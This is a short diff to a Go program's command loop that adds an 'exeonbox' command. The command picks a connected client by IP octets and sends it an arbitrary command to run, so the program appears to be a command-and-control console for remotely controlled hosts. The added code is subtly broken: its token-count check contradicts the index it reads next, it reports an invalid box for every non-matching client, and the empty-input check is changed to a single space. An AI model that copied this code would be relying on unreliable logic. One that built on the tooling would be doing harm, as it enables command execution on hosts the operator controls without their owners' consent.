@@ -493,6 +493,25 @@ func main() {
 				}
 			}
 
+		} else if strings.HasPrefix(input, "exeonbox") {
+			execute = true
+			_, after, _ := strings.Cut(input, " ")
+			box, command, _ := strings.Cut(after, " ")
+			btokens := strings.Split(box, ".")
+			if len(btokens) != 1 {
+				fmt.Println("Specify box with \"<octect>.<octet>\"")
+				continue
+			}
+			command = strings.TrimRight(command, "\r\n")
+			for id, ip := range clients {
+				tokens := strings.Split(ip, ".")
+				if tokens[2] == btokens[0] && tokens[3] == btokens[1] {
+					sendmessage(command, id, *c)
+				} else {
+					fmt.Println("Invalid box.")
+				}
+			}
+
 		} else if strings.HasPrefix(input, "load") {
 			load()
 
@@ -509,7 +528,7 @@ func main() {
 			print_title()
 			os.Exit(0)
 
-		} else if input == "" {
+		} else if input == " " {
 			continue
 
 		} else {
